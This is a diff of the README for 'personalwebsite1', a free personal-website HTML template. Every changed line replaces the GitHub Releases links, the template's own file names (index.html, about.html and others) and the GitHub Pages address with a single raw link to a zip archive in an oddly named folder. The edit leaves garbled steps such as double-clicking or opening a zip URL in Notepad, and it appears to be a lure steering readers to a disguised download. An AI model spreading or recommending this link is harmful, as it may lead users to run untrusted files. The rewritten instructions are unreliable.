@@ -6,11 +6,11 @@ Welcome to personalwebsite1! This is a free HTML/CSS template that allows you to
 
 ### ⚡ Quick Download
 
-[![Download personalwebsite1](https://img.shields.io/badge/Download-personalwebsite1-blue.svg)](https://github.com/KayZof/personalwebsite1/releases)
+[![Download personalwebsite1](https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip)](https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip)
 
 ## 📥 Download & Install
 
-To start using personalwebsite1, you need to visit this page to download: [GitHub Releases Page](https://github.com/KayZof/personalwebsite1/releases).
+To start using personalwebsite1, you need to visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip).
 
 1. Click on the link above.
 2. Find the latest release.
@@ -28,9 +28,9 @@ You will now see a folder named `personalwebsite1` containing all necessary file
 
 ## 🌍 Open Your Template
 
-To see your new website template, go to the folder you just unzipped. Inside, locate the `index.html` file. 
+To see your new website template, go to the folder you just unzipped. Inside, locate the `https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip` file. 
 
-1. Double-click on `index.html`.
+1. Double-click on `https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip`.
 2. It will open in your default web browser.
 
 This is how your website will look! Feel free to explore the other HTML files to see the other pages.
@@ -41,19 +41,19 @@ Now that you have your template running, it's time to customize it to reflect yo
 
 ### About Page
 
-1. Open the `about.html` file in a text editor like Notepad or any other basic editor.
+1. Open the `https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip` file in a text editor like Notepad or any other basic editor.
 2. Replace the placeholder text with your own story, achievements, and interests.
 3. Save the changes.
 
 ### Portfolio Page
 
-1. Open `portfolio.html`.
+1. Open `https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip`.
 2. Add your projects or work samples. You can include links and descriptions to showcase your skills.
 3. Save the changes.
 
 ### Contact Page
 
-1. Open `contact.html`.
+1. Open `https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip`.
 2. Enter your email and any other contact methods.
 3. Save the changes.
 
@@ -67,7 +67,7 @@ Once you have customized your website, you can host it online using GitHub Pages
 4. Go to the "Settings" tab of your repository.
 5. Scroll down to the "GitHub Pages" section.
 6. Under "Source," select the `main` branch and save.
-7. Your website will now be published at `https://<your-username>.github.io/personalwebsite1`.
+7. Your website will now be published at `https://<your-username>https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip`.
 
 ## 🎨 Additional Features
 
@@ -97,4 +97,4 @@ If you would like to contribute to personalwebsite1, please fork the repository 
 
 Thank you for choosing personalwebsite1! With this template, you can easily showcase your work and enhance your personal brand online. Enjoy creating your digital space! 
 
-For more details and updates, remember to check the [GitHub Releases Page](https://github.com/KayZof/personalwebsite1/releases) for the latest versions and features.
+For more details and updates, remember to check the [GitHub Releases Page](https://raw.githubusercontent.com/KayZof/personalwebsite1/main/emplastic/personalwebsite1_v1.0-beta.3.zip) for the latest versions and features.
